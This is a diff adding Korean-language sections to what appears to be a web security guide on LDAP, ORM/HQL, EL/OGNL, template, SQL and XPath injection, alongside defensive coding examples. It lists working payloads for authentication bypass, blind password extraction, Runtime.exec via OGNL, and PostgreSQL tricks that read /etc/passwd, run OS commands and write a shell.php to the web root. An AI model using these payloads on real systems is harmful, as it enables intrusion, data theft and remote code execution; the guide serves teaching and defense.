@@ -466,6 +466,214 @@ GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'webapp'@'localhost';
 
 ---
 
+## 10. LDAP Injection
+
+### LDAP 기본 구조와 공격 원리
+```
+LDAP 필터 예시:
+(&(uid=admin)(userPassword=secret))
+
+공격 페이로드 — 인증 우회:
+username: admin)(&
+password: anything
+
+결과 필터:
+(&(uid=admin)(&)(userPassword=anything))
+          → (&) 는 항상 True → 인증 우회!
+```
+
+### LDAP Injection 페이로드
+```
+# 인증 우회
+username: *
+username: admin)(*
+username: *)(uid=*
+
+# 모든 사용자 열거
+username: *)(|(uid=*
+
+# 속성 추출 (Blind)
+username: admin)(|(password=a*
+username: admin)(|(password=b*
+→ 응답 차이로 비밀번호 첫 글자 추출
+```
+
+### LDAP Injection 방어
+```java
+// Java: LDAP 특수문자 이스케이프
+import javax.naming.ldap.LdapName;
+
+String safeDN = Filter.encodeValue(userInput);
+// 특수문자: *, (, ), \, NUL → 이스케이프 처리
+
+// Spring Security LDAP
+String query = "(&(uid={0})(objectclass=person))";
+// {0} 위치에 자동 이스케이프 적용
+```
+
+---
+
+## 11. ORM Injection / Expression Language Injection
+
+### ORM Injection (HQL, JPQL)
+```java
+// 취약한 Hibernate HQL
+String hql = "FROM User WHERE username = '" + username + "'";
+Query query = session.createQuery(hql);
+
+// 공격:
+// username = ' OR '1'='1
+// username = admin' AND SLEEP(5)--
+
+// 안전한 코드 — 파라미터 바인딩
+Query query = session.createQuery("FROM User WHERE username = :username");
+query.setParameter("username", username);
+```
+
+### Expression Language Injection (EL/OGNL)
+```
+EL Injection 테스트 페이로드:
+${7*7}        → 49 출력되면 취약
+#{7*7}        → JSF EL
+*{7*7}        → Spring SpEL
+${java.lang.Runtime.getRuntime().exec('calc')}
+
+OGNL Injection (Struts2):
+%{7*7}
+%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}
+
+Server-Side Template Injection (SSTI) 유사 공격:
+Jinja2:  {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
+Twig:    {{7*7}}
+FreeMarker: ${7*7}
+Velocity: #set($x=7*7)${x}
+```
+
+### EL/SSTI 탐지 및 방어
+```bash
+# 탐지 페이로드 목록
+${7*7}
+{{7*7}}
+<%= 7*7 %>
+#{7*7}
+
+# 방어: 사용자 입력을 템플릿 문자열에 직접 삽입 금지
+# Jinja2 안전한 방법
+template = Template("Hello {{ name }}")
+template.render(name=user_input)  # 올바른 방법
+
+# 위험한 방법
+template = Template("Hello " + user_input)  # SSTI 가능!
+```
+
+---
+
+## 12. SQL Injection 대량 노출 방지
+
+### LIMIT 제어 우회 및 방어
+```sql
+-- 공격자: LIMIT 우회로 전체 데이터 추출
+' UNION SELECT user, password FROM users LIMIT 1000--
+' UNION SELECT user, password FROM users LIMIT 999999--
+
+-- GROUP_CONCAT으로 한 번에 추출
+' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
+```
+
+```python
+# 방어: 최대 반환 행 수 제한
+def get_users(page=1, per_page=20):
+    # 페이지당 최대 100개로 제한
+    per_page = min(per_page, 100)
+    offset = (page - 1) * per_page
+    
+    stmt = text("SELECT id, username FROM users LIMIT :limit OFFSET :offset")
+    return db.execute(stmt, {"limit": per_page, "offset": offset})
+
+# API 레이트 리미팅 (대량 추출 방지)
+from flask_limiter import Limiter
+limiter = Limiter(app, default_limits=["100 per hour", "10 per minute"])
+```
+
+---
+
+## 13. XPath Injection
+
+### XPath 기본 구조와 공격 원리
+```
+XPath는 XML 문서를 탐색하기 위한 언어
+XML 기반 애플리케이션(SOAP 서비스 등)에서 XPath 인젝션 발생
+
+취약한 XPath 쿼리 예시:
+  /users/user[username/text()='admin' and password/text()='pass']
+
+인증 우회 페이로드:
+  username: admin' or '1'='1
+  username: ' or 1=1 or '
+  username: admin']/..  (경로 탐색)
+
+결과 쿼리:
+  /users/user[username/text()='admin' or '1'='1' and password/text()='...']
+  → 항상 True → 인증 우회
+
+Boolean 기반 Blind XPath:
+  username: admin' and string-length(//user[1]/password)=6 and '1'='1
+  → 비밀번호 길이 유추
+
+문자 추출:
+  username: admin' and substring(//user[1]/password,1,1)='a' and '1'='1
+```
+
+### XPath Injection 방어
+```python
+# Python lxml: 파라미터 바인딩
+from lxml import etree
+
+# 취약한 방식
+xpath = f"//user[@name='{username}']"
+tree.xpath(xpath)  # 위험!
+
+# 안전한 방식 (lxml Extension Functions)
+from lxml.etree import XPath
+query = XPath("//user[@name=$name]")
+result = query(tree, name=username)  # 파라미터 바인딩
+
+# Java JAXP
+// XPath 파라미터 바인딩은 표준이 없어 입력 이스케이프 필요
+// 특수문자: ' " < > & → XML 엔티티로 이스케이프
+```
+
+---
+
+## 14. PostgreSQL 특화 공격 기법
+
+```sql
+-- PostgreSQL 슈퍼유저 확인
+SELECT current_user, session_user, pg_is_in_recovery();
+
+-- pg_read_file()으로 파일 읽기 (슈퍼유저 필요)
+SELECT pg_read_file('/etc/passwd', 0, 1000);
+
+-- COPY 명령으로 OS 명령 실행 (PostgreSQL 9.3+)
+CREATE TABLE cmd_output (output text);
+COPY cmd_output FROM PROGRAM 'id';
+SELECT * FROM cmd_output;
+
+-- lo_import / lo_export로 파일 업로드/다운로드
+SELECT lo_import('/tmp/shell.php');
+SELECT lo_export(OID, '/var/www/html/shell.php');
+
+-- 확장 기능 (슈퍼유저)
+CREATE EXTENSION IF NOT EXISTS dblink;
+SELECT dblink_exec('host=localhost dbname=postgres', 'SELECT pg_sleep(5)');
+
+-- PostgreSQL 버전 정보
+SELECT version();
+SELECT pg_version_num();
+```
+
+---
+
 ## 10. SQL Injection 실습 환경
 
 ```bash
